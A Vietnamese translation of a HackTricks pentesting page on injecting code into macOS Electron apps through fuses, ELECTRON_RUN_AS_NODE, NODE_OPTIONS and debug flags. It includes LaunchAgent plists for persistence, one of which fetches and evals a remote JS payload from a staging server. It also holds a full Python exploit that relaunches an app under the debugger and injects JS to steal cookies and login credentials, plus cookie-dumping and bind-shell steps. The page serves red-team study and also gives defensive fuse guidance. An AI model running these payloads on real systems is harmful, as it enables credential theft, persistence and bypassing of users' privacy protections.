# Injection ứng dụng Electron trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Nếu bạn chưa biết Electron là gì, bạn có thể tìm thấy [**nhiều thông tin tại đây**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Nhưng hiện tại, chỉ cần biết rằng Electron chạy **node**.\
Và node có một số **tham số** và **biến môi trường** có thể được dùng để **khiến nó thực thi mã khác** ngoài tệp được chỉ định.

### Electron Fuses

Các kỹ thuật này sẽ được thảo luận tiếp theo, nhưng gần đây Electron đã bổ sung một số **cờ bảo mật để ngăn chặn chúng**. Đây là [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) và những fuse sau được dùng để **ngăn** các ứng dụng Electron trên macOS **tải mã tùy ý**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Nếu bị tắt, fuse này ngăn việc sử dụng biến môi trường **`ELECTRON_RUN_AS_NODE`** để inject code.
- **`EnableNodeCliInspectArguments`**: Nếu bị tắt, các tham số như `--inspect`, `--inspect-brk` sẽ không được áp dụng, từ đó ngăn việc inject code theo cách này.
- **`EnableEmbeddedAsarIntegrityValidation`**: Nếu được bật, tệp **`asar`** đã tải sẽ được macOS **xác thực**. Điều này **ngăn** việc **inject code** bằng cách sửa đổi nội dung của tệp này.
- **`OnlyLoadAppFromAsar`**: Nếu được bật, thay vì tìm và tải theo thứ tự sau: **`app.asar`**, **`app`** rồi cuối cùng là **`default_app.asar`**, ứng dụng chỉ kiểm tra và sử dụng app.asar. Nhờ đó, khi **kết hợp** với fuse **`embeddedAsarIntegrityValidation`**, việc **tải mã chưa được xác thực** sẽ trở nên **bất khả thi**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Nếu được bật, tiến trình trình duyệt sẽ sử dụng tệp có tên `browser_v8_context_snapshot.bin` làm V8 snapshot.

Một fuse thú vị khác không ngăn việc inject code là:

- **EnableCookieEncryption**: Nếu được bật, kho cookie trên ổ đĩa sẽ được mã hóa bằng khóa mật mã cấp hệ điều hành.

### Kiểm tra Electron Fuses

Bạn có thể **kiểm tra các cờ này** từ một ứng dụng bằng cách:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Chỉnh sửa Electron Fuses

Như [**tài liệu đề cập**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), cấu hình của **Electron Fuses** được thiết lập bên trong **Electron binary**, nơi chứa chuỗi **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Trong các ứng dụng macOS, tệp này thường nằm tại `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

Bạn có thể tải file này lên [https://hexed.it/](https://hexed.it/) và tìm chuỗi trước đó. Sau chuỗi này, bạn sẽ thấy trong ASCII một số "0" hoặc "1" cho biết từng fuse đang bị tắt hay bật. Chỉ cần sửa mã hex (`0x30` là `0` và `0x31` là `1`) để **thay đổi giá trị fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Lưu ý rằng nếu bạn cố **ghi đè** binary **`Electron Framework`** bên trong một ứng dụng bằng các byte đã sửa đổi này, ứng dụng sẽ không chạy.

## RCE bằng cách thêm code vào Electron Applications

Có thể Electron App đang sử dụng **các file JS/HTML bên ngoài**, vì vậy kẻ tấn công có thể inject code vào những file này. Chữ ký của chúng sẽ không được kiểm tra và code tùy ý có thể được thực thi trong ngữ cảnh của ứng dụng.

> [!CAUTION]
> Tuy nhiên, hiện có 2 hạn chế:
>
> - Cần có quyền **`kTCCServiceSystemPolicyAppBundles`** để sửa đổi một App, vì vậy mặc định việc này không còn khả thi.
> - File **`asap`** đã biên dịch thường có các fuse **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `được bật`
>
> Điều này khiến đường tấn công phức tạp hơn (hoặc không thể thực hiện).

Lưu ý rằng có thể vượt qua yêu cầu về quyền **`kTCCServiceSystemPolicyAppBundles`** bằng cách sao chép ứng dụng sang một thư mục khác (chẳng hạn như **`/tmp`**), đổi tên thư mục **`app.app/Contents`** thành **`app.app/NotCon`**, **sửa đổi** file **asar** bằng code **độc hại** của bạn, đổi tên lại thành **`app.app/Contents`** rồi thực thi ứng dụng.<sup>[[5]](#references)</sup>

Bạn có thể giải nén code từ file asar bằng lệnh:

```bash
npx asar extract app.asar app-decomp
```

Và đóng gói lại sau khi đã chỉnh sửa bằng:

```bash
npx asar pack app-decomp app-new.asar
```

## RCE với ELECTRON_RUN_AS_NODE

Theo [**tài liệu**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), nếu biến môi trường này được đặt, tiến trình sẽ khởi chạy như một tiến trình Node.js thông thường.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> Nếu fuse **`RunAsNode`** bị vô hiệu hóa, biến môi trường **`ELECTRON_RUN_AS_NODE`** sẽ bị bỏ qua và cách này sẽ không hoạt động.

### Injection từ App Plist

Như [**đề xuất tại đây**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), bạn có thể lạm dụng biến môi trường này trong plist để duy trì persistence:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## RCE with `NODE_OPTIONS`

Bạn có thể lưu payload trong một file khác rồi thực thi nó:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> Nếu fuse **`EnableNodeOptionsEnvironmentVariable`** bị **tắt**, ứng dụng sẽ **bỏ qua** biến môi trường **NODE_OPTIONS** khi được khởi chạy, trừ khi biến môi trường **`ELECTRON_RUN_AS_NODE`** được đặt. Biến này cũng sẽ bị **bỏ qua** nếu fuse **`RunAsNode`** bị tắt.
>
> Nếu không đặt **`ELECTRON_RUN_AS_NODE`**, bạn sẽ gặp **lỗi**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection từ App Plist

Bạn có thể lạm dụng biến môi trường này trong một plist để duy trì persistence bằng cách thêm các khóa sau:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## RCE bằng inspecting

Theo [**bài viết này**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), nếu chạy một ứng dụng Electron với các flag như **`--inspect`**, **`--inspect-brk`** và **`--remote-debugging-port`**, một **debug port sẽ được mở** để bạn có thể kết nối tới đó (ví dụ: từ Chrome tại `chrome://inspect`), và bạn sẽ có thể **inject code vào đó** hoặc thậm chí khởi chạy tiến trình mới.<sup>[[7]](#references)</sup>\
Ví dụ:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

Trong [**bài blog này**](https://hackerone.com/reports/1274695), kỹ thuật debugging này bị lợi dụng để khiến Headless Chrome **tải các file tùy ý xuống những vị trí tùy ý**.<sup>[[8]](#references)</sup>

> [!TIP]
> Nếu ứng dụng có cách riêng để kiểm tra xem các biến môi trường hoặc tham số như `--inspect` có được thiết lập hay không, bạn có thể thử **bypass** kiểm tra đó khi runtime bằng arg `--inspect-brk`. Arg này sẽ **dừng quá trình thực thi** ngay khi ứng dụng bắt đầu, để bạn thực hiện bypass (ví dụ: ghi đè các arg hoặc biến môi trường của tiến trình hiện tại).

Sau đây là một exploit: bằng cách giám sát và chạy ứng dụng với tham số `--inspect-brk`, có thể bypass cơ chế bảo vệ tùy chỉnh của ứng dụng (ghi đè các tham số của tiến trình để xóa `--inspect-brk`), rồi inject payload JS để dump cookie và thông tin xác thực từ ứng dụng:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> Nếu fuse **`EnableNodeCliInspectArguments`** bị tắt, ứng dụng sẽ **bỏ qua các tham số node** (chẳng hạn như `--inspect`) khi khởi chạy, trừ khi biến môi trường **`ELECTRON_RUN_AS_NODE`** được đặt. Biến này cũng sẽ bị **bỏ qua** nếu fuse **`RunAsNode`** bị tắt.
>
> Tuy nhiên, bạn vẫn có thể dùng **tham số Electron `--remote-debugging-port=9229`**, nhưng payload trước đó sẽ không hoạt động để thực thi các process khác.

Dùng tham số **`--remote-debugging-port=9222`**, bạn có thể đánh cắp một số thông tin từ Electron App, chẳng hạn như **lịch sử** (bằng các lệnh GET) hoặc **cookies** của trình duyệt (vì chúng được **giải mã** bên trong trình duyệt và có một **endpoint JSON** cung cấp chúng).

Bạn có thể tìm hiểu cách thực hiện [**tại đây**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) và [**tại đây**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), đồng thời sử dụng công cụ tự động [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) hoặc một script đơn giản như sau:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### Injection từ App Plist

Bạn có thể lạm dụng biến môi trường này trong một plist để duy trì persistence bằng cách thêm các khóa sau:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## TCC Bypass bằng cách lạm dụng các phiên bản cũ hơn

> [!TIP]
> TCC daemon của macOS không kiểm tra phiên bản ứng dụng được thực thi. Vì vậy, nếu bạn **không thể inject code vào ứng dụng Electron** bằng bất kỳ kỹ thuật nào trước đó, bạn có thể tải xuống phiên bản APP cũ hơn và inject code vào đó vì ứng dụng vẫn sẽ có các quyền TCC (trừ khi Trust Cache ngăn chặn).

## Chạy mã không phải JS

Các kỹ thuật trước đó cho phép bạn chạy **mã JS bên trong tiến trình của ứng dụng Electron**. Tuy nhiên, hãy nhớ rằng **các tiến trình con chạy trong cùng sandbox profile** với ứng dụng cha và **kế thừa quyền TCC của ứng dụng đó**.\
Do đó, nếu muốn lạm dụng entitlements để truy cập camera hoặc microphone chẳng hạn, bạn chỉ cần **chạy một binary khác từ tiến trình đó**.

## Các lỗ hổng Electron macOS đáng chú ý (2023-2024)

### CVE-2023-44402 – Bypass tính toàn vẹn ASAR

Electron ≤22.3.23 và nhiều bản pre-release 23-27 cho phép kẻ tấn công có quyền ghi vào thư mục `.app/Contents/Resources` bypass các fuse `embeddedAsarIntegrityValidation` **và** `onlyLoadAppFromAsar`. Lỗi nằm ở *sự nhầm lẫn loại tệp* trong trình kiểm tra tính toàn vẹn, khiến một **thư mục được tạo sẵn có tên `app.asar`** được tải thay cho archive đã xác thực, do đó mọi JavaScript đặt bên trong thư mục này đều được thực thi khi ứng dụng khởi động. Vì vậy, ngay cả các nhà cung cấp đã làm theo hướng dẫn hardening và bật cả hai fuse vẫn dễ bị tấn công trên macOS.<sup>[[3]](#references)</sup>

Các phiên bản Electron đã vá: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** và **27.0.0-alpha.7**. Kẻ tấn công phát hiện ứng dụng đang chạy bản dựng cũ hơn có thể ghi đè `Contents/Resources/app.asar` bằng thư mục của chúng để thực thi code với các TCC entitlements của ứng dụng.<sup>[[3]](#references)</sup> 

### Cụm CVE “RunAsNode” / “enableNodeCliInspectArguments” năm 2024

Vào tháng 1 năm 2024, một loạt CVE (CVE-2024-23738 đến CVE-2024-23743) cho thấy nhiều ứng dụng Electron vẫn bật các fuse **RunAsNode** và **EnableNodeCliInspectArguments**. Vì vậy, kẻ tấn công cục bộ có thể khởi chạy lại chương trình với biến môi trường `ELECTRON_RUN_AS_NODE=1` hoặc các flag như `--inspect-brk` để biến chương trình thành một tiến trình Node.js *đa dụng* và kế thừa toàn bộ sandbox cùng quyền TCC của ứng dụng.<sup>[[4]](#references)</sup>

Mặc dù nhóm Electron phản đối mức độ nghiêm trọng “critical” và lưu ý rằng kẻ tấn công vốn đã cần thực thi code cục bộ, vấn đề này vẫn hữu ích trong giai đoạn hậu khai thác vì nó biến mọi bundle Electron dễ bị tấn công thành một binary *living-off-the-land*, chẳng hạn có thể đọc Contacts, Photos hoặc các tài nguyên nhạy cảm khác đã được cấp quyền trước đó cho ứng dụng desktop.<sup>[[4]](#references)</sup>

Hướng dẫn phòng thủ từ các nhà bảo trì Electron:<sup>[[4]](#references)</sup>

* Tắt các fuse `RunAsNode` và `EnableNodeCliInspectArguments` trong các bản dựng production.
* Dùng API **UtilityProcess** mới hơn nếu ứng dụng thực sự cần một tiến trình Node.js trợ giúp, thay vì bật lại các fuse đó. 

## Inject tự động

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Có thể dễ dàng sử dụng công cụ [**electroniz3r**](https://github.com/r3ggi/electroniz3r) để **tìm các ứng dụng electron dễ bị tấn công** đã cài đặt và inject code vào chúng. Công cụ này sẽ thử dùng kỹ thuật **`--inspect`**:<sup>[[5]](#references)</sup>

Bạn cần tự biên dịch công cụ và có thể sử dụng như sau:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki được thiết kế để cài backdoor vào các ứng dụng Electron bằng cách thay thế các tệp JavaScript của ứng dụng bằng các tệp JavaScript Command & Control của Loki.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injection macOS thông qua framework bên thứ ba - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Bypass tính toàn vẹn ASAR thông qua nhầm lẫn loại tệp (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Tuyên bố về các CVE của 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRON hóa quyền riêng tư trên macOS - Vũ khí mới trong kho công cụ Red Team của bạn - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Biến môi trường | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Vì sao ứng dụng Electron không thể lưu trữ bí mật của bạn một cách bảo mật: tùy chọn --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Báo cáo HackerOne #1274695 - Lạm dụng tính năng debug của Electron để tải xuống các tệp tùy ý](https://hackerone.com/reports/1274695)
- [9] [Thò tay vào hũ cookie: Dump cookie bằng cổng Remote Debugger của Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debug lỗi dump cookie bằng Remote Debugger của Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
